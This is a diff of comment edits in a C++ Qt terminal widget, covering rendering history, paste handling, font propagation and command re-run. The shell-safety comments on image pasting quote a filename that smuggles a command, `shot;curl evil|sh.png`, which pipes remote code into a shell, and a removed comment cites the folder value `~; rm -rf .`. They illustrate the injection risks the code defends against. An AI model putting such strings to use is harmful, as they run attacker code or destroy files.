@@ -94,27 +94,9 @@ TerminalWidget::TerminalWidget(QWidget *parent) : QWidget(parent) {
     setAttribute(Qt::WA_InputMethodEnabled, true);
     setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Expanding);
 
-    // 0.7.4 refactor: TerminalWidget was a QOpenGLWidget from 0.1.0
-    // through 0.7.3. That produced ~54 Hz continuous UpdateRequest
-    // events on the top-level MainWindow (measured via paint-log
-    // instrumentation on both Wayland and X11), which cascaded full
-    // widget-tree repaints into every child — including the menubar
-    // behind any open dropdown popup — producing the dropdown-
-    // flicker symptom reported 2026-04-20. PartialUpdate,
-    // WA_OpaquePaintEvent, swapInterval=0, alpha-buffer opt-out, and
-    // attribute-stack experiments all failed to break the cascade;
-    // QOpenGLWidget composites its FBO through the parent's backing
-    // store and the composition path always invalidates the top-
-    // level.
-    //
-    // Switching the base class to plain QWidget eliminates the GL
-    // composition path entirely. QPainter works against the widget's
-    // standard backing store, partial-rect updates work as expected,
-    // and the menubar never repaints as a side-effect of terminal
-    // output. The default QPainter path — already ligature-aware via
-    // QTextLayout / HarfBuzz — is the only rendering path; the
-    // dormant GlRenderer was retired in 0.7.44 after sitting
-    // compiled-but-unreachable for 39 releases.
+    // A plain QWidget, not a QOpenGLWidget: GL composition kept
+    // repainting the whole window tree, the menubar behind open popups
+    // included. QPainter is the only rendering path. History: CHANGELOG 0.7.4.
     setAttribute(Qt::WA_OpaquePaintEvent, true);
 
 
@@ -935,7 +917,7 @@ bool TerminalWidget::event(QEvent *event) {
 }
 
 // A finished command's run time as the block chrome shows it: "850ms",
-// "4.2s" or "3m07s" style. ANTS-5077 — the stamps are wall-clock, so a
+// "4.2s" or "3m7s" style. ANTS-5077 — the stamps are wall-clock, so a
 // backwards clock step clamps to zero rather than showing a negative time.
 namespace {
 QString formatCommandDuration(qint64 startMs, qint64 endMs) {
@@ -1576,7 +1558,7 @@ void TerminalWidget::paintFoldIndicator(QPainter &p, const PromptRegion &pr,
     QColor foldColor = m_cursorColor;
     foldColor.setAlpha(120);
     p.setPen(foldColor);
-    // Draw a small triangle (right = expanded, down = collapsed)
+    // Draw a small triangle (right = collapsed, down = expanded)
     if (pr.folded) {
         // Right-pointing triangle (collapsed)
         QPolygon tri;
@@ -2316,7 +2298,7 @@ void TerminalWidget::wheelEvent(QWheelEvent *event) {
     // captures, it captures the post-mutation grid. Capturing
     // synchronously here closes the race.
     //
-    // Other scroll-up paths (Shift+PageUp, Shift+Home, Shift+Up)
+    // Other scroll-up paths (Shift+PageUp, Shift+Home)
     // already work correctly because they set m_scrollOffset
     // non-zero synchronously, so updateScrollBar() captures the
     // snapshot before any batch can race. This branch only matters
@@ -2859,8 +2841,8 @@ void TerminalWidget::checkIdleNotification() {
 // for. Contract: bare local paths of the image files in `urls`, joined
 // with a space; empty when there are none.
 //
-// Shell safety. Unlike the saved-image path in keyPressEvent — whose
-// filename we generate, so it is safe by construction — this path is
+// Shell safety. The saved-image path in pasteFromClipboard is quoted too,
+// because the configured folder may hold a space or `$(`. This path is
 // whatever the file happens to be called on disk, and a downloaded or
 // extracted file can be named `shot;curl evil|sh.png`. The paste lands
 // at a shell prompt for tokenisation, and pasteRiskReasons() flags
@@ -2929,38 +2911,19 @@ void TerminalWidget::pasteFromClipboard(QClipboard::Mode mode) {
         if (!img.isNull()) {
             // Auto-save image and insert filepath into terminal.
             //
-            // 0.7.53 (2026-04-27 indie-review HIGH) — path
-            // validation. m_imagePasteDir is user-configurable
-            // via the settings dialog, but the *filename* is
-            // pasted verbatim to the PTY for the shell to
-            // consume. A configured directory like
-            // `~; rm -rf .` would generate a filename starting
-            // with `~; rm -rf ./paste_…` and a careless shell
-            // command (e.g. `cat <paste>`) would tokenise it
-            // dangerously. Canonicalise the configured directory
-            // and require it to live under $HOME — anything
-            // outside falls back to the safe default. Also use
-            // a UUID4 suffix so a fast paste burst within the
-            // same millisecond can't clobber an earlier paste.
+            // Rule: a configured image folder outside $HOME is replaced by
+            // the default. The check runs before the folder is created. The
+            // filename gets a UUID suffix so a fast burst of pastes cannot
+            // overwrite an earlier one.
             const QString defaultDir =
                 QDir::homePath() + "/Pictures/ClaudePaste";
             QString dir = m_imagePasteDir.isEmpty()
                 ? defaultDir
                 : m_imagePasteDir;
 
-            // Canonicalise BEFORE mkpath. Two prior bugs flagged by
-            // indie-review-2026-05-19 terminalwidget H2:
-            //   (a) `startsWith(canonHome)` is a textual prefix
-            //       check — `/home/alice-evil` would pass when the
-            //       home was `/home/alice`. Fix: require either
-            //       exact match OR canonHome + '/' as the prefix.
-            //   (b) `mkpath(dir)` ran BEFORE the prefix check. A
-            //       bad `m_imagePasteDir` value created a real
-            //       directory outside $HOME as a side effect, then
-            //       got rejected and re-targeted to the safe
-            //       default — the bad directory persisted on disk.
-            //       Fix: canonicalise first; only mkpath an
-            //       accepted path.
+            // Canonicalise BEFORE mkpath, and match $HOME exactly or as a
+            // prefix followed by '/', so `/home/alice-evil` is not inside
+            // `/home/alice`.
             const QString canonHome =
                 QDir(QDir::homePath()).canonicalPath();
             auto isInsideHome = [&](const QString &candidate) {
@@ -3059,7 +3022,7 @@ void TerminalWidget::pasteToTerminal(const QByteArray &data,
         });
 }
 
-// Fully async confirmation dialog, matching mainwindow.cpp::showDiffViewer's
+// Fully async confirmation dialog, matching the diff viewer's (diffviewer.cpp)
 // pattern exactly: heap-allocated QDialog + WA_DeleteOnClose +
 // show()/raise()/activateWindow(), caller returns immediately, the send
 // happens in the accept callback. Two prior 0.7.4 attempts (QDialog::exec(),
@@ -5998,14 +5961,6 @@ void TerminalWidget::clearClaudeQuestionPrompt() {
     // Belt-and-suspenders clear for the AskUserQuestion dot (ANTS-1858
     // follow-up).
     //
-    // ANTS-3364 — this described the defect it was written against and not
-    // the code as it stands. m_claudeDetectTimer IS single-shot, but it is no
-    // longer "restarted on every PTY batch": the batch path starts it only
-    // when idle, which turns it into a ~300 ms throttle that fires DURING
-    // continuous output rather than being perpetually reset by a spinner
-    // repainting faster than its interval. So the footer-gone N=3 debounce
-    // does accumulate now, and the starvation this comment claimed is gone.
-    //
     // The clear is kept because the debounce is not the only way the dot goes
     // out: it needs three quiet-gap scans, and a question answered mid-stream
     // leaves the sticky state set until they arrive. The hook-driven clear
@@ -6377,11 +6332,12 @@ void TerminalWidget::checkTriggers(const QByteArray &data) {
 
 // 0.6.13 — grid-mutation trigger dispatch. Called from the grid's
 // line-completion callback once per newline, passing the screen row the
-// cursor was leaving. Runs the subset of trigger rules that mutate the grid
-// (highlight_line, highlight_text, make_hyperlink) on the finalized line
-// text. Mutations land on the screen row directly — if that row is about
-// to scroll into scrollback, scrollUp's std::move preserves the applied
-// attrs/hyperlinks.
+// cursor was leaving. Three jobs: it emits the plugin `line` event; it runs
+// the trigger rules that mutate the grid (highlight_line, highlight_text,
+// make_hyperlink) on the finalized line text; and it fires the non-instant
+// dispatch triggers (notify, sound, command and the like). Mutations land
+// on the screen row directly — if that row is about to scroll into
+// scrollback, scrollUp's std::move preserves the applied attrs/hyperlinks.
 //
 // actionValue grammar for the new types:
 //   highlight_line / highlight_text:  "#fg" | "#fg/#bg" | "/#bg"
@@ -6604,15 +6560,12 @@ void TerminalWidget::updateSuggestion() {
 void TerminalWidget::setFontFamily(const QString &family) {
     if (family.isEmpty()) return;
     m_font.setFamily(family);
-    // ANTS-1211 — propagating to the 3 styled variants matches the
-    // user mental model "I picked one font for everything." If the
-    // user has previously customized per-style families via
-    // setBoldFontFamily / setItalicFontFamily / setBoldItalicFontFamily,
-    // those are silently dropped here (and will be re-derived from the
-    // new base inside updateFontMetrics(): m_fontBold = m_font +
-    // setBold). UI ordering: callers that want both base + per-style
-    // customization MUST call setFontFamily FIRST, then the per-style
-    // setters. Reverse order silently loses the per-style overrides.
+    // ANTS-1211 — the styled variants follow the base family: "I picked one
+    // font for everything." updateFontMetrics() rebuilds all three from
+    // m_font on every call, so it also drops any per-style family set by
+    // setBoldFontFamily / setItalicFontFamily / setBoldItalicFontFamily.
+    // Callers that want per-style fonts set them after this call; a size
+    // change keeps them.
     m_fontBold.setFamily(family);
     m_fontItalic.setFamily(family);
     m_fontBoldItalic.setFamily(family);
@@ -6821,7 +6774,9 @@ void TerminalWidget::rerunCommandAt(int index) {
     QString cmd = commandTextAt(index);
     if (cmd.isEmpty() || !hasPty()) return;
     // Write the command followed by carriage return (Enter). pasteToTerminal
-    // is not used here because we want the command executed, not pasted.
+    // is not used here: it would wrap the text in bracketed-paste markers and
+    // apply the paste-risk prompt, while the trust check here is the signed
+    // OSC 133 marker below.
     const QByteArray bytes = cmd.toUtf8();
     // ANTS-5029 — only signed OSC 133 markers prove this block came from the
     // shell; program output can print unsigned ones. So an unsigned re-run
